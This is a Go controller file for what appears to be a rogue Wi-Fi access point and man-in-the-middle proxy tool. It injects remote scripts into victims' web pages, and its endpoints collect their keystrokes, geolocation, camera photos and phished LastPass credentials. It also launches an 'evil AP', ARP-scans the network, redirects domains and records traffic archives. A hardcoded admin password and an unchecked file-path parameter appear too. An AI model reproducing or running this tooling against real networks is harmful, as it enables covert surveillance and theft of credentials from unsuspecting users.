package controllers

import (
	"github.com/revel/revel"
	// "github.com/jeffail/gabs"
	"log"
	"io/ioutil"
	"os/exec"
	"path/filepath"
	"time"
	"strings"
	"net"
)

const (
    PASSWORD = "demonstration"
    SECURE = false
)

type App struct {
	*revel.Controller
}

func (c App) GetField() revel.Result {
	//this is to get the state of the proxy
	var field int
	c.Params.Bind(&field, "field")
	log.Println("field: ", field)
	switch field {
		case 0:
			//its the har state
			log.Println("hars! ", globalStoreHAR)
			return c.RenderJson(globalStoreHAR)
		case 1: return c.RenderJson(globalRedirects)
		case 2: return c.RenderJson(globalBlocks)
		case 3: return c.RenderJson(globalWolfPack)
		case 4: return c.RenderJson(globalInjectKeyLogger)
		case 5: return c.RenderJson(globalInjectGetLocation)
		case 6: return c.RenderJson(globalInjectLastpass)
		default: return c.RenderJson("")
	}
}

func InitiateProxy() {
	//set the location for files
    log.Println("loading storage location")
    fileLocation, proxyAddress := setFileStorageLocation()
    //setting the logger to output to a file

    log.Println("location: ", fileLocation, " address: ", proxyAddress)
    //reset all parameters for the proxy
	globalStoreHAR = false			
	globalProxyStandard = false
	globalRedirects = false
	globalBlocks = false
	globalWolfPack = false
	
	//reset scripts
	globalInjectKeyLogger = false
	globalInjectGetLocation  = false
	globalInjectGetPhoto = false
	globalInjectGetLogin = false
	globalInjectLastpass = false

	//turn on the basic proxy
	globalProxyStandard = true

	INJECT_LOGGER_RESULT = "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/keylogger.js\"></script></body>" 
	INJECT_PHOTO_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/takePhoto.js\"></script></body>"
	INJECT_LOCATION_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/getLocation.js\"></script></body>"
	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
	users = make(map[string]string)
	go arpScanner() //start the arpscanner in the background
	// getRedirectUrls() //temporary
}

func (c App) FetchAllData() revel.Result {

    //get the redirect pages from server
    log.Println("downloading files")
    // getPages()
    //get a list of urls to redirect
    log.Println("creating redirections...")
    getRedirectUrls()
    //get a list of urls to block
    log.Println("get blocked urls...")
    getBannedUrls()
    log.Println("get news sites")
    getNewsUrls()
    log.Println("completed getting files....")
    return c.RenderJson("finished fetching")
}
func (c App) ArpScan() revel.Result {
	return c.RenderJson(users)
}

func (c App) Login() revel.Result {
	var p string
	c.Params.Bind(&p, "password")
	log.Println("password: ", p)
	if p == PASSWORD {
		password = p
		return c.Redirect("/App/Index")
	}
	return c.Render()
}

//
func (c App) Index() revel.Result {
	StartSimpleProxy()
	return c.Render()
}

func (c App) StartSimpleProxy() revel.Result {
	// Kill the proxy anyways.
	KillProxy()
	// If the proxy was off, start a new one.
	if globalProxyStandard == false {
		globalProxyStandard = true
		StartSimpleProxy()
		log.Println("Proxy started")
		return c.RenderJson("{Proxy:'Started'}")
	} else {
		globalProxyStandard = false
	}
	// Return 
	log.Println("Proxy shutting down")
	log.Println("location: ", fileLocation, " address: ", proxyAddress)
	return c.RenderJson("{Proxy:'restarted}")
}

// Function to kill the proxy.
func KillProxy() {
	// if stoppableListener != nil {
	var err error
		stoppableListener.Close()
		log.Println("waiting for socket to close")

	    wg.Wait()
        listener, err = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT) 
	    if err != nil {
	        log.Println("error here: ", err)
	    }   
}

func (c App) ToggleHarCollection() revel.Result {
	globalStoreHAR = !globalStoreHAR
	log.Println(" --- OPTION: Toggling har collection: ", globalStoreHAR)
	return c.RenderJson(globalStoreHAR)
}

// Function that redirects specific domains.
func (c App) TriggerRedirects() revel.Result {
	if globalRedirects == false {
		globalRedirects = true
		log.Println(" --- OPTION: Turning on redirects")
		log.Println("     ", redirect)
	} else {
		globalRedirects = false
		log.Println(" --- OPTION: Turning off redirects")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson(redirect) // Return list of redirects.
}

// Function that redirects specific domains.
func (c App) TriggerBlocks() revel.Result {
	if globalBlocks == false {
		globalBlocks = true
		log.Println(" --- OPTION: Turning on blocking")
		log.Println("     ", banned)
	} else {
		globalBlocks = false
		log.Println(" --- OPTION: Turning off blocking")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson(banned) // Return list of redirects.
}

func (c App) TriggerWolfPack() revel.Result {
	if globalWolfPack == false {
		globalWolfPack = true
		log.Println(" --- OPTION: Turning on wolf-pack-hack")
	} else {
		globalWolfPack = false
		log.Println(" --- OPTION: Turning off wolf-pack-hack")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson("") // Return list of redirects.
}

//
func (c App) TriggerInjection() revel.Result {
	// Get the replace and result.
	var trigger string
	//
	c.Params.Bind(&trigger, "trigger")
	//
	if trigger == "keylogger" {
		if globalInjectKeyLogger == false {
			globalInjectKeyLogger = true
			log.Println(" --- OPTION: Turning on key-logger")
		} else {
			globalInjectKeyLogger = false
			log.Println(" --- OPTION: Turning off key-logger")
		}
	} else if trigger == "getlocation" {
		if globalInjectGetLocation == false {
			globalInjectGetLocation = true
			log.Println(" --- OPTION: Turning on Location Request")
		} else {
			globalInjectGetLocation = false
			log.Println(" --- OPTION: Turning on Location Request")
		}
	} else if trigger == "takephoto" {
		if globalInjectGetPhoto == false {
			globalInjectGetPhoto = true
			log.Println(" --- OPTION: Turning on Photo Request")
		} else {
			globalInjectGetPhoto = false
			log.Println(" --- OPTION: Turning on Photo Request")
		}
	} else if trigger == "requestlogin" {
		if globalInjectGetLogin == false {
			globalInjectGetLogin = true
			log.Println(" --- OPTION: Turning on Login Request")
		} else {
			globalInjectGetLogin = false
			log.Println(" --- OPTION: Turning on Login Request")
		}
	} else if trigger == "requestlasspass" {
		if globalInjectLastpass == false {
			globalInjectLastpass = true
			log.Println(" --- OPTION: Turning on Login Request")
		} else {
			globalInjectLastpass = false
			log.Println(" --- OPTION: Turning on Login Request")
		}
	} 
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson("")
}

func (c App) ConnectToWifi() revel.Result {
	var wifiName string
	var wifiPassword string
	c.Params.Bind(&wifiName, "wifiName")
	c.Params.Bind(&wifiPassword, "wifiPassword")
	//if you are evil you attack this application right here
	log.Println("/srv/wifi/setupwifi.sh", " ", wifiName, " ", wifiPassword)
	cmd := exec.Command("/srv/wifi/setupwifi.sh", wifiName, wifiPassword)
	output, err := cmd.CombinedOutput()
	log.Println(string(output), " errors: ", err)
	return c.RenderJson(output)
}

func (c App) CreateAccessPoint() revel.Result {
	var apName string
	var connection string
	c.Params.Bind(&connection, "connection")
	c.Params.Bind(&apName, "name")
	//if you are evil you attack this application right here
	log.Println("/srv/wifi/setupEvilAP.sh", " ", connection, " ", apName)
	cmd := exec.Command("/srv/wifi/setupEvilAP.sh", connection, apName)
	output, err := cmd.CombinedOutput()
	log.Println(string(output), " errors: ", err)
	return c.RenderJson(output)
}


func (c App) GetLocations() revel.Result {
	return c.RenderJson(locations)
}
func (c App) CatchLocation() revel.Result {
	var lat string
	var lon string
	c.Params.Bind(&lat, "latitude")
	c.Params.Bind(&lon, "longitude")
	var l Location
	l.Latitude = lat
	l.Longitude = lon
	t := time.Now().Local()
	l.Timestamp = t.Format("20060102150405")
	s := strings.Split(c.Request.RemoteAddr, ":")
	ip := s[0]
	l.IP = ip
	locations = append(locations, l)
	return c.RenderJson("location updated")
}


func (c App) GetKeylogs() revel.Result {
	return c.RenderJson(keylogs)
}
/*
<input type="text" id="lppasswordbottom" class="lpinput" placeholder="Password">
<input type="text" id="lppasswordtop" class="lpinput" placeholder="Password">
*/
func (c App) Lastpass() revel.Result {
	var username string
	var password string
	c.Params.Bind(&username, "lppasswordtop")
	c.Params.Bind(&password, "lppasswordbottom")
	var l Lastpass 
	l.Username = username
	l.Password = password
	lastPassAccounts = append(lastPassAccounts, l)
	//return all the lastpass accounts
	return c.RenderJson("null")
}

func (c App) GetLastpass() revel.Result {
	return c.RenderJson(lastPassAccounts)
}
func (c App) CatchKeyLog() revel.Result {
	var u string
	var d string
	var p string
	var o string
	c.Params.Bind(&u, "userid")
	c.Params.Bind(&d, "data")
	c.Params.Bind(&p, "page")
	c.Params.Bind(&o, "object")
	if d != "" {
		var k KeyLog
		k.Page = p
		k.Content = d
		k.UserId = u
		t := time.Now().Local()
		k.Timestamp = t.Format("20060102150405")
		k.DomObject = o
		keylogs = append(keylogs, k)
		return c.RenderJson("logger updated")
	}
	return c.RenderJson("null")
}

func (c App) GetHars() revel.Result {
	var fileNames []string
	log.Println("reading hars from: ", harLocation+"/hars/")
	files, err := ioutil.ReadDir(harLocation+"/hars/")
	if err != nil {
		log.Println("error: ", err)
	}
	for _, f := range files {
		log.Println(f.Name())
        fileNames = append(fileNames, f.Name())
    }
	return c.RenderJson(fileNames)
}

func (c App) GetHar() revel.Result {
	var harName string
	c.Params.Bind(&harName, "harname")
    data, err := ioutil.ReadFile(harLocation+"/hars/"+harName)
    log.Println("location: ", harLocation+"/hars/"+harName)
    if err != nil {
    	return c.RenderJson("The file may not exist...")
    }
    // log.Println("har: ", string(data))

	// jsonParsed, _ := gabs.ParseJSON(data)
	// log.Println(jsonParsed)
	// // S is shorthand for Search
	// children, _ := jsonParsed.S("entries").Children()
	// for _, child := range children {
	//     log.Println(child.Data().(string))
	// }

    return c.RenderJson(string(data))
}
func (c App) Pinger() revel.Result {
	return c.RenderJson(pingServer())
}
func (c App) DeleteHars() revel.Result {
	var w Walker
	filepath.Walk(harLocation+"/hars", w.utilsDeletefiles)
	return c.RenderJson(w.files)
}